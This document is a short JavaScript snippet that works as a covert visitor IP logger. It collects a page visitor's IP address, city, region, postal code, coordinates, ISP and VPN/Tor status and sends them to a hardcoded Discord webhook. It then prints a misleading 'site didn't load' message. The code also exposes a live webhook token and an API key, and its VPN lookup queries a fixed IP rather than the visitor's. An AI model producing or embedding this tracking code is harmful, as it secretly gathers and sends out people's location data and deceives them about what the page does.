$.getJSON("https://ipinfo.io/json", function(data) {     
  var x = new XMLHttpRequest()
  x.onreadystatechange = function(){
      if (this.readyState == 4 && this.status == 200) {
          var OtherInfo = JSON.parse(this.response);
          var params = {
            embeds: [
              {
                "title": "GET REVERSE ENGINEERED",
                "color": 15258703,
                "thumbnail": {
                },
                "fields": [
                  {
                    "name": "IP Address",
                    "value": `> ${data.ip}`
                  },
                  {
                    "name": "GeoLocation Info",
                    "value": `>>> Town, State: ${data.city}, ${data.region}\nCountry: ${data.country}\nPostal Code: ${data.postal}\nTimeZone: ${(data.timezone).replace('_', ' ')}\nLong/Lat: ${data.loc}`
                  },
                  {
                    "name": "Network Info",
                    "value": `>>> HostName: ${data.hostname}\nISP: ${data.org}\n`
                  },
                  {
                    "name": "Other Information",
                    "value": `>>> VPN: ${OtherInfo['security'].vpn}\nProxy: ${OtherInfo['security'].proxy}\nTor: ${OtherInfo['security'].tor}\nRelay: ${OtherInfo['security'].relay}\nASN: ${OtherInfo['network'].autonomous_system_number}`
                  }
                ]
              }
            ]
          }
          try {
            fetch('https://discord.com/api/webhooks/1100562137312657498/pb7w3wreJMctjLgj9Mhzrc0f6OxUWM5Ke5y0ObMwubbTvmRdgrH8ngkAXUt6PStAvF9M', {
              method: "POST",
              headers: {
                  'Content-type': 'application/json'
              },
              body: JSON.stringify(params)
            }).then(res => {
              console.log("Uh oh, site didn't load. Contact the owner!")
            });
          } catch (err) {
            console.log("ERROR! ", err)
          }
      }
  }

  x.open("GET",'https://vpnapi.io/api/212.8.253.162?key=37f527c9d76948e584dd61c491d3147f')
  x.send()
})
